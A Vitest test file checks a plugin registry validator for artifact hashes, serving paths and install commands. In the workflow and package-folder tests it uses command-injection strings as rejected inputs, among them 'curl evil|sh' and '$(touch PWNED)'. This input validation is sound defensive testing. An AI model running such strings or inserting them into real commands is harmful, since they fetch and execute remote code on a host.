import { createHash } from 'node:crypto';
import { existsSync, readdirSync, readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { describe, expect, test } from 'vitest';
import { plugin as fixturePlugin } from '../../testing/fixture-plugin-agent/plugin';
import { type AgentPlugin, type HostedArtifact, PluginRegistry } from '../contract';
import { AGENT_PLUGINS } from '../generated/plugins';
import { pluginViolationsOf, pluginWorkflowViolationsOf, type PluginCheckEntry, type PluginCheckSources } from './plugins';

const REPOSITORY_ROOT = fileURLToPath(new URL('../../../../', import.meta.url));
const APPLICATIONS_FOLDER = 'apps';
const PLUGIN_FOLDER_SUFFIX = '-plugin';
const FIXTURE_ID = 'fixture-plugin-agent';
const WHEEL_BYTES = Buffer.from('wheel bytes');
const WHEEL_SHA256 = createHash('sha256').update(WHEEL_BYTES).digest('hex');
const RELEASE_FOLDER = 'synthetic/release';
const REQUIREMENTS_FILENAME = 'synthetic-requirements.txt';
const WHEEL_FILENAME = 'synthetic.whl';

function realFile(path: string): Buffer | null {
  if (!existsSync(`${REPOSITORY_ROOT}${path}`)) return null;
  return readFileSync(`${REPOSITORY_ROOT}${path}`);
}

function sha256Of(bytes: Buffer): string {
  return createHash('sha256').update(bytes).digest('hex');
}

function memoryFiles(input: { files: Record<string, Buffer> }): (path: string) => Buffer | null {
  return (path) => {
    const file = input.files[path];
    if (file === undefined) return null;
    return file;
  };
}

function artifactOf(input: Partial<HostedArtifact> & { filename: string; expectedSha256: string }): HostedArtifact {
  return {
    label: input.filename,
    path: `/pkg/${input.filename}`,
    contentType: 'text/plain',
    releaseFolder: RELEASE_FOLDER,
    embeddedInInstallCommand: false,
    ...input,
  };
}

function syntheticPlugin(input: Partial<AgentPlugin>): AgentPlugin {
  return {
    ...fixturePlugin,
    registry: PluginRegistry.Npm,
    packageFolder: 'synthetic',
    hostedArtifacts: [],
    versionPins: [],
    installCommand: 'install',
    ...input,
  };
}

function syntheticSources(input: Partial<PluginCheckSources>): PluginCheckSources {
  return { applicationPluginFolders: [], readFile: () => null, servedFilenames: [], ...input };
}

function syntheticViolations(input: { plugin: AgentPlugin; sources: Partial<PluginCheckSources> }): string[] {
  return pluginViolationsOf({ entries: [{ id: 'synthetic', plugin: input.plugin }], sources: syntheticSources(input.sources) });
}

function wheelAndRequirements(input: { requirementsText: string }): { plugin: AgentPlugin; files: Record<string, Buffer> } {
  const requirements = Buffer.from(input.requirementsText);
  const plugin = syntheticPlugin({
    registry: PluginRegistry.SelfHostedWheel,
    installCommand: `pip install ${sha256Of(requirements)}`,
    hostedArtifacts: [
      artifactOf({ filename: WHEEL_FILENAME, expectedSha256: WHEEL_SHA256 }),
      artifactOf({ filename: REQUIREMENTS_FILENAME, expectedSha256: sha256Of(requirements), embeddedInInstallCommand: true }),
    ],
  });
  return {
    plugin,
    files: { [`${RELEASE_FOLDER}/${WHEEL_FILENAME}`]: WHEEL_BYTES, [`${RELEASE_FOLDER}/${REQUIREMENTS_FILENAME}`]: requirements },
  };
}

describe('pluginViolationsOf on the real registry', () => {
  test('accepts every registered plugin against the repository', () => {
    const entries: PluginCheckEntry[] = Object.entries(AGENT_PLUGINS).map(([id, plugin]) => ({ id, plugin }));
    const servedFilenames = entries.flatMap((entry) => entry.plugin.hostedArtifacts.map((artifact) => artifact.filename));
    const applicationPluginFolders = readdirSync(`${REPOSITORY_ROOT}${APPLICATIONS_FOLDER}`)
      .filter((name) => name.endsWith(PLUGIN_FOLDER_SUFFIX))
      .map((name) => `${APPLICATIONS_FOLDER}/${name}`);
    expect(pluginViolationsOf({ entries, sources: { applicationPluginFolders, readFile: realFile, servedFilenames } })).toEqual([]);
  });
});

describe('pluginViolationsOf', () => {
  test('accepts the fixture plugin', () => {
    const entries = [{ id: FIXTURE_ID, plugin: fixturePlugin }];
    const sources = {
      applicationPluginFolders: [fixturePlugin.packageFolder],
      readFile: realFile,
      servedFilenames: ['fixture-requirements.txt'],
    };
    expect(pluginViolationsOf({ entries, sources })).toEqual([]);
  });

  test('rejects a plugin package that no plugin.ts claims', () => {
    expect(
      syntheticViolations({ plugin: syntheticPlugin({}), sources: { applicationPluginFolders: ['apps/stray-plugin', 'synthetic'] } }),
    ).toEqual(['apps/stray-plugin is claimed by no plugin.ts']);
  });

  test('rejects a plugin package that two plugin.ts files claim', () => {
    const entries = [
      { id: 'first', plugin: syntheticPlugin({}) },
      { id: 'second', plugin: syntheticPlugin({}) },
    ];
    expect(pluginViolationsOf({ entries, sources: syntheticSources({ applicationPluginFolders: ['synthetic'] }) })).toEqual([
      'synthetic is claimed by first and second',
    ]);
  });

  test('rejects a version pin that the file does not match', () => {
    const plugin = syntheticPlugin({ versionPins: [{ path: 'synthetic/manifest.json', pattern: /"version": "9\.9\.9"/ }] });
    const readFile = memoryFiles({ files: { 'synthetic/manifest.json': Buffer.from('{"version": "0.1.0"}') } });
    expect(syntheticViolations({ plugin, sources: { readFile } })).toEqual([
      'synthetic: synthetic/manifest.json does not match "version": "9\\.9\\.9"',
    ]);
  });

  test('rejects a version pin whose file is missing', () => {
    const plugin = syntheticPlugin({ versionPins: [{ path: 'synthetic/gone.json', pattern: /x/ }] });
    expect(syntheticViolations({ plugin, sources: {} })).toEqual(['synthetic: synthetic/gone.json is missing']);
  });

  test('rejects an artifact served from outside /pkg/', () => {
    const artifact = artifactOf({ filename: WHEEL_FILENAME, expectedSha256: WHEEL_SHA256, path: `/files/${WHEEL_FILENAME}` });
    const readFile = memoryFiles({ files: { [`${RELEASE_FOLDER}/${WHEEL_FILENAME}`]: WHEEL_BYTES } });
    expect(
      syntheticViolations({
        plugin: syntheticPlugin({ hostedArtifacts: [artifact] }),
        sources: { readFile, servedFilenames: [WHEEL_FILENAME] },
      }),
    ).toEqual([`synthetic: ${WHEEL_FILENAME} must be served at /pkg/${WHEEL_FILENAME}`]);
  });

  test('rejects an artifact hash that is not 64 hexadecimal characters', () => {
    const artifact = artifactOf({ filename: WHEEL_FILENAME, expectedSha256: 'abc' });
    const readFile = memoryFiles({ files: { [`${RELEASE_FOLDER}/${WHEEL_FILENAME}`]: WHEEL_BYTES } });
    const violations = syntheticViolations({
      plugin: syntheticPlugin({ hostedArtifacts: [artifact] }),
      sources: { readFile, servedFilenames: [WHEEL_FILENAME] },
    });
    expect(violations).toContain(`synthetic: ${WHEEL_FILENAME} hash must be 64 hexadecimal characters`);
  });

  test('rejects an artifact whose release file hashes to something else', () => {
    const artifact = artifactOf({ filename: WHEEL_FILENAME, expectedSha256: sha256Of(Buffer.from('other')) });
    const readFile = memoryFiles({ files: { [`${RELEASE_FOLDER}/${WHEEL_FILENAME}`]: WHEEL_BYTES } });
    expect(
      syntheticViolations({
        plugin: syntheticPlugin({ hostedArtifacts: [artifact] }),
        sources: { readFile, servedFilenames: [WHEEL_FILENAME] },
      }),
    ).toEqual([`synthetic: ${RELEASE_FOLDER}/${WHEEL_FILENAME} does not hash to ${artifact.expectedSha256}`]);
  });

  test('rejects an artifact whose release file is missing', () => {
    const artifact = artifactOf({ filename: WHEEL_FILENAME, expectedSha256: WHEEL_SHA256 });
    expect(
      syntheticViolations({ plugin: syntheticPlugin({ hostedArtifacts: [artifact] }), sources: { servedFilenames: [WHEEL_FILENAME] } }),
    ).toEqual([`synthetic: ${RELEASE_FOLDER}/${WHEEL_FILENAME} is missing`]);
  });

  test('rejects an install command that omits the hash of a flagged artifact', () => {
    const { plugin, files } = wheelAndRequirements({ requirementsText: `wheel ${WHEEL_SHA256}` });
    const stale = { ...plugin, installCommand: 'pip install' };
    const servedFilenames = [WHEEL_FILENAME, REQUIREMENTS_FILENAME];
    expect(syntheticViolations({ plugin: stale, sources: { readFile: memoryFiles({ files }), servedFilenames } })).toEqual([
      `synthetic: the install command must embed the hash of ${REQUIREMENTS_FILENAME}`,
    ]);
  });

  test('rejects a requirements file that omits the hash of the wheel', () => {
    const { plugin, files } = wheelAndRequirements({ requirementsText: 'wheel without a hash' });
    const servedFilenames = [WHEEL_FILENAME, REQUIREMENTS_FILENAME];
    expect(syntheticViolations({ plugin, sources: { readFile: memoryFiles({ files }), servedFilenames } })).toEqual([
      `synthetic: ${REQUIREMENTS_FILENAME} must contain the hash of ${WHEEL_FILENAME}`,
    ]);
  });

  test('accepts a wheel with a requirements file that carries its hash', () => {
    const { plugin, files } = wheelAndRequirements({ requirementsText: `wheel ${WHEEL_SHA256}` });
    const servedFilenames = [WHEEL_FILENAME, REQUIREMENTS_FILENAME];
    expect(syntheticViolations({ plugin, sources: { readFile: memoryFiles({ files }), servedFilenames } })).toEqual([]);
  });

  test('rejects an allowlist that serves a file no plugin hosts and misses one a plugin hosts', () => {
    const { plugin, files } = wheelAndRequirements({ requirementsText: `wheel ${WHEEL_SHA256}` });
    const servedFilenames = [WHEEL_FILENAME, 'stray.whl'];
    expect(syntheticViolations({ plugin, sources: { readFile: memoryFiles({ files }), servedFilenames } })).toEqual([
      `/pkg/ serves stray.whl but no plugin hosts it`,
      `no /pkg/ route serves ${REQUIREMENTS_FILENAME}`,
    ]);
  });
});

describe('pluginFolderViolationsOf', () => {
  test.each(['apps/x$(touch PWNED)-plugin', 'apps/a b-plugin', 'apps/a;b-plugin', 'apps/a`b`-plugin', ''])(
    'refuses the package folder %j',
    (packageFolder) => {
      const entry: PluginCheckEntry = { id: FIXTURE_ID, plugin: { ...fixturePlugin, packageFolder } };
      expect(pluginWorkflowViolationsOf({ entries: [entry] })).toContain(`${FIXTURE_ID}: the package folder must match ^[A-Za-z0-9._/-]+$`);
    },
  );

  test('accepts the package folder of the real registry', () => {
    const entries = Object.entries(AGENT_PLUGINS).map(([id, plugin]) => ({ id, plugin }));
    expect(pluginWorkflowViolationsOf({ entries }).filter((message) => message.includes('package folder'))).toEqual([]);
  });
});

describe('pluginWorkflowViolationsOf', () => {
  function entryWith(workflow: Partial<AgentPlugin['workflow']>): PluginCheckEntry {
    return { id: FIXTURE_ID, plugin: { ...fixturePlugin, workflow: { ...fixturePlugin.workflow, ...workflow } } };
  }

  test('accepts the workflow of the real registry', () => {
    const entries = Object.entries(AGENT_PLUGINS).map(([id, plugin]) => ({ id, plugin }));
    expect(pluginWorkflowViolationsOf({ entries })).toEqual([]);
  });

  test.each(['x" ; curl evil|sh #', 'a b', '$(id)', 'x\ny', ''])('refuses the filter %j', (filter) => {
    expect(pluginWorkflowViolationsOf({ entries: [entryWith({ filter })] })).toEqual([
      `${FIXTURE_ID}: the workflow filter must match ^[@\\w/.-]+$`,
    ]);
  });

  test.each(['x; id', '@scoped', 'a b', ''])('refuses the name %j', (name) => {
    expect(pluginWorkflowViolationsOf({ entries: [entryWith({ name })] })).toEqual([
      `${FIXTURE_ID}: the workflow name must match ^[\\w/.-]+$`,
    ]);
  });

  test.each(['x"; id', '../elsewhere/requirements-dev.txt', 'other/requirements-dev.txt'])(
    'refuses the requirements path %j',
    (pythonRequirements) => {
      expect(pluginWorkflowViolationsOf({ entries: [entryWith({ pythonRequirements })] })).toHaveLength(1);
    },
  );

  test('accepts a requirements path inside the package folder', () => {
    const pythonRequirements = `${fixturePlugin.packageFolder}/requirements-dev.txt`;
    expect(pluginWorkflowViolationsOf({ entries: [entryWith({ pythonRequirements })] })).toEqual([]);
  });
});

describe('pluginViolationsOf for a self-hosted wheel', () => {
  test('refuses a plugin whose artifacts are all hosted separately from the install command', () => {
    const { plugin, files } = wheelAndRequirements({ requirementsText: 'x' });
    const flagless = {
      ...plugin,
      hostedArtifacts: plugin.hostedArtifacts.map((artifact) => ({ ...artifact, embeddedInInstallCommand: false })),
    };
    const violations = syntheticViolations({
      plugin: { ...flagless, registry: PluginRegistry.SelfHostedWheel },
      sources: { readFile: memoryFiles({ files }), servedFilenames: flagless.hostedArtifacts.map((artifact) => artifact.filename) },
    });
    expect(violations).toContain('synthetic: exactly one hosted artifact must be embedded in the install command');
  });

  test('refuses a plugin whose install command embeds two artifacts', () => {
    const { plugin, files } = wheelAndRequirements({ requirementsText: 'x' });
    const doubled = {
      ...plugin,
      hostedArtifacts: plugin.hostedArtifacts.map((artifact) => ({ ...artifact, embeddedInInstallCommand: true })),
    };
    const violations = syntheticViolations({
      plugin: { ...doubled, registry: PluginRegistry.SelfHostedWheel },
      sources: { readFile: memoryFiles({ files }), servedFilenames: doubled.hostedArtifacts.map((artifact) => artifact.filename) },
    });
    expect(violations).toContain('synthetic: exactly one hosted artifact must be embedded in the install command');
  });
});
